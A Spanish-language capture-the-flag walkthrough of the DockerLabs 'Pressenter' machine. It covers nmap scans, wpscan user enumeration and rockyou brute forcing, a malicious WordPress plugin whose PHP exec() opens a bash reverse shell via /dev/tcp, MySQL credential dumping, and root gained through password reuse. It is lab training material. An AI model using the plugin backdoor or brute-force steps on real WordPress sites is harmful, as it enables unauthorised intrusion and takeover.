#MAQUINA #DOCKERLABS #FACIL 
#WPSCAN 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Pressenter** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 11:44 CET
Initiating ARP Ping Scan at 11:44
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:44, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:44
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:44, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-02 11:44:56 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
                                                                      

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 11:45 CET
Nmap scan report for escolares.dl (172.17.0.2)
Host is up (0.000023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Pressenter CTF
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 11:45 CET
Nmap scan report for escolares.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos que parece no haber nada, pero hay una redirección hacia http://pressenter.hl.
Al entrar vemos que es un WordPress( lo pone al final de la pagina).

Usamos **wpscan** :
   ```bash
 wpscan --url "http://pressenter.hl/" --enumerate u
```

**Usuario -> pressi**

   ```bash
 wpscan --url "http://pressenter.hl/" -U pressi -P /usr/share/wordlists/rockyou.txt
```

**Usuario -> pressi**
**Contrasena -> dumbass**

# EXPLOTACION

Nos registramos como pressi (http://pressenter.hl/wp-login.php).

Nos vamos a plugins y subimos y activamos un plugin. Vamos a subir un zip que nos otorgue una reverse shell y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**).
Contenido del zip, un php con:

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Vemos que no podemos escalar por SUDO, ni SUID ni cosas así.
Buscamos el archivo de configuración de wordpress (**wp-config.php**)
Vemos que tenemos un usuario de mysql (admin) y una contraseña (rooteable). Accedemos y dejo los comandos empleados hasta lo importante:

   ```bash
mysql -u admin -p
show databases;
use wordpress;
show tables;
select * from wp_usernames;

```
**Usuario -> enter** (se encuentra en el /etc/passwd  también)
**Contrasena -> kernellinuxhack**

YA ESTAMOS COMO ENTER.

El usuario **root** reutiliza la contraseña de **enter**

**YA ESTAMOS COMO ROOT.**

